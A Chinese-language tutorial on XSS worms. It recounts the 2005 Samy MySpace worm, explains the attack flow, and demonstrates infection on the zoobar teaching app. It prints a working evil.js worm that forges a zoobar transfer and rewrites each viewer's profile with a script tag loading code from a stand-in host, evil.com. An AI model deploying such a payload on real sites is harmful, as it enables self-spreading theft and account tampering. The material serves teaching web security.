# XSS Worm

XSS蠕虫不仅可以攻击用户而且还可以大规模感染

---

## 历史上第一次XSS Worm

2005年10月4日，世界上第一只“Web 2.0蠕虫”诞生了。当时有人在国外著名社交网络MySpace上写了一段 JavaScript 蠕虫代码，利用 Ajax 方法让无数的用户在
毫不知情的情况下把作者加入了好友名单，同时在他们的个人简介里自动加上了 “samy is my hero” 的字样。

当时19岁的 Samy 是蠕虫编写者，编写蠕虫的原因是为了跟女友打赌他可以在 MySpace 上拥有众多的粉丝，可是又达不到要求，于是，他稍微研究了一下 MySpace的
安全性，并发现网站的个人简介处存在XSS漏洞。随后， Samy 在自己的个人简介中写入了一段 JavaScript 代码，每个查看他简介的人会在不知不觉中执行这段代码，
接着该蠕虫会打开受害者的个人简介，把恶意的 JavaScript 代码片段复制进去。同样，任何查看受害者个人简介的人也会被感染，藉此 Samy XSS Worm 在 MySpace
上疯散播，一天内就感染了超过100万用户。由于极其惊人的传播速度，最终导致 MySpace 服务器崩溃。

下面是 Samy 的截图：

![Firest XSS Worm](img/xss-worm-1.jpg)

可以看到有919664页用户的好友请求，这就是XSS Worm爆发的“战果”。

所谓的跨站脚本蠕虫（XSS Worm），实质上是一段脚本程序，通常用 JavaScript或 VbScript 写成，在用户浏览XSS页面的时被激活。蠕虫利用
站点页面的 XSS 漏洞根据其特定规则进行传播和感染。

值得注意的是，XSS蠕虫只是 Web 2.0 蠕虫的其中一种，也是最广为人知的一种，它利用网络的XSS漏洞进行散播。Web 2.0 蠕虫还有其他形式，如 CSRF Worm，
顾名思义，该类蠕虫是利用网站的 CSRF 漏洞进行攻击。

##XSS Worm攻击原理
 
XSS蠕虫通常使用了大量的 [Ajax](https://developer.mozilla.org/en/docs/AJAX) 技术。Ajax 的作用就在于：无须刷新即可异步传输数据，经过服务器
处理后，得到返回信息，再提示给用户。如此一来，使跨站蠕虫具有较强的传播性和隐蔽性，而且蔓延速度相当惊人，呈几何级发展。

一个完整的 XSS Worm的攻击流程如下。

1.  攻击者发现目标网站存在XSS漏洞，并且可以编写 XSS 蠕虫。
2.  利用宿主 （如博客空间） 作为传播源头进行 XSS 攻击。
3.  当其他用户访问被感染的空间时，XSS 蠕虫就继续感染。

##XSS Worm 感染演示

首先，作为宿主本身要作为源头进行XSS攻击。用户名为 wang,Balance为 20 zoobars。
每个注册用户都会默认分配10个 zoobars，用户可以将其自由转移给其他人。

![XSS Worm code](img/xss-worm-2.png)

我们在Profile里面写入了恶意代码，只要别人查看就会被感染，接下来让我们注册个新用户 worm1:

![XSS Worm1](img/xss-worm-3.png)

可以看到默认拥有10个zoobars，并且profile为空的。接下来让我们查看一下宿主用户wang：

![XSS Worm1 view](img/xss-worm-4.png)

这时查看到了wang的Balance为 20 zoobars，同时恶意代码得到了执行，让我们查看 worm1的profile：

![XSS Worm1 attack](img/xss-worm-5.png)

可以发现 worm1用户的profile已经被感染，同时zoobars也被偷取了一个。返回查看可以发现wang的zoobars添加了一个。

##XSS Worm攻击代码分析

下面是 evil.js的代码内容：

		var http = new XMLHttpRequest();
		http.open("POST", "http://myzoo.com/transfer.php", true);
		http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
		http.send("zoobars=1&recipient=wang&submission=Send");
		var http = new XMLHttpRequest();
		http.open("POST", "http://myzoo.com/index.php", true);
		http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
		var data="profile_update=%3Cscript%3E%0D%0A+%0D%0A+var+script+%3Ddocument.createElement%28%22script%22%29%3B%0D%0A+script.setAttribute%28%22src%22%2C%22http%3A%2F%2Fevil.com%2Fevil.js%22%29%3B%0D%0A+document.body.appendChild%28script%29%3B%0D%0A%3C%2Fscript%3E&profile_submit=Save";
		http.send(data);

代码本质上就是模拟用户请求发送转移zoobars的合法请求，然后修改用户的Profile，使得用户也被感染恶意代码。

##参考

[Cross-Site Scripting Worms & Viruses](https://www.whitehatsec.com/assets/WP5CSS0607.pdf)

[Technical explanation of The MySpace Worm](http://namb.la/popular/tech.html)